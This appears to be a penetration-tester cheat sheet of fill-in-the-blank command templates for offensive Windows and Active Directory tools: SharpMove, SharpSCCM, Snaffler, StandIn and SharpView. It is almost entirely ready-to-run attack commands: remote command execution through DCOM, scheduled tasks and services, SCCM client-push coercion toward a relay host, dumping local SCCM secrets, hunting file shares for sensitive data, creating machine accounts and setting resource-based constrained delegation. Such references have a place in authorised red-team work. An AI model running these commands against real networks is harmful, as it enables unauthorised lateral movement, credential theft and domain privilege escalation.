# Sharp Tools

## SharpMove

### DCOM execution

Execute DCOM execution with Sharp Tools.

```cmd title:"Sharp Tools Execute DCOM Execution"
SharpMove.exe action=dcom computername=$rhost_name command="$command" method=$dcom_method amsi=true
```
<!-- cheat
var rhost_name
var command
var dcom_method = printf 'MMC20\nShellWindows\nShellBrowserWindow\n' --- --header 'DCOM method'
-->

### Task Scheduler execution

Execute task scheduler execution with Sharp Tools.

```cmd title:"Sharp Tools Execute Task Scheduler Execution"
SharpMove.exe action=taskscheduler computername=$rhost_name command="$command" taskname=$task_name amsi=true username=$domain\$user password=$pass
```
<!-- cheat
var rhost_name
var command
var task_name
var domain
var user
var pass
-->

### Service execution

Execute service execution with Sharp Tools.

```cmd title:"Sharp Tools Execute Service Execution"
SharpMove.exe action=modsvc computername=$rhost_name command="$command" amsi=true servicename=$service_name
```
<!-- cheat
var rhost_name
var command
var service_name
-->

## SharpSCCM

### Enumerate SCCM administrators

Enumerate SCCM administrators with Sharp Tools.

```powershell title:"Sharp Tools Enumerate SCCM Administrators"
.\SharpSCCM.exe get class-instances SMS_ADMIN
```
<!-- cheat -->

### Get resource ID

Get resource ID with Sharp Tools.

```powershell title:"Sharp Tools Get Resource ID"
.\SharpSCCM.exe get resource-id -d "$computer_name"
```
<!-- cheat
var computer_name
-->

### Trigger client push coercion

Trigger client push coercion with Sharp Tools.

```powershell title:"Sharp Tools Trigger Client Push Coercion"
.\SharpSCCM.exe invoke client-push -mp "$mp_fqdn" -sc "$site_code" -t "$relay_host"
```
<!-- cheat
var mp_fqdn
var site_code
var relay_host
-->

### Execute deployment

Execute deployment with Sharp Tools.

```powershell title:"Sharp Tools Execute Deployment"
.\SharpSCCM.exe exec -rid $resource_id -r "$target"
```
<!-- cheat
var resource_id
var target
-->

### Dump local SCCM secrets

Dump local SCCM secrets with Sharp Tools.

```powershell title:"Sharp Tools Dump Local SCCM Secrets"
.\SharpSCCM.exe local secrets disk
```
<!-- cheat -->

## Snaffler

### Domain share hunt

Run domain share hunt with Sharp Tools.

```powershell title:"Sharp Tools Run Domain Share Hunt"
.\Snaffler.exe -d "$domain" -c -s
```
<!-- cheat
var domain
-->

### Host list share hunt

List host list share hunt with Sharp Tools.

```powershell title:"Sharp Tools List Host List Share Hunt"
.\Snaffler.exe -n "$hosts" -s
```
<!-- cheat
var hosts
-->

### Directory hunt

Run directory hunt with Sharp Tools.

```powershell title:"Sharp Tools Run Directory Hunt"
.\Snaffler.exe -i "$path" -s
```
<!-- cheat
var path
-->

## StandIn

### MachineAccountQuota

Read MachineAccountQuota with Sharp Tools.

```cmd title:"Sharp Tools Read MachineAccountQuota"
StandIn.exe --object ms-DS-MachineAccountQuota=*
```
<!-- cheat -->

### Add machine account

Add machine account with Sharp Tools.

```cmd title:"Sharp Tools Add Machine Account"
StandIn.exe --computer "$computer_name" --make --password "$computer_pass"
```
<!-- cheat
var computer_name
var computer_pass
-->

### Set RBCD

Set RBCD with Sharp Tools.

```cmd title:"Sharp Tools Set RBCD"
StandIn.exe --computer "$target_computer" --sid "$controlled_computer_sid"
```
<!-- cheat
var target_computer
var controlled_computer_sid
-->

## SharpView

### Domain user

Enumerate domain user with Sharp Tools.

```powershell title:"Sharp Tools Enumerate Domain User"
.\SharpView.exe Get-DomainUser -Identity "$user"
```
<!-- cheat
var user
-->

### Object ACL

Enumerate object ACL with Sharp Tools.

```powershell title:"Sharp Tools Enumerate Object ACL"
.\SharpView.exe Get-ObjectAcl -Identity "$target_object" -ResolveGUIDs
```
<!-- cheat
var target_object
-->
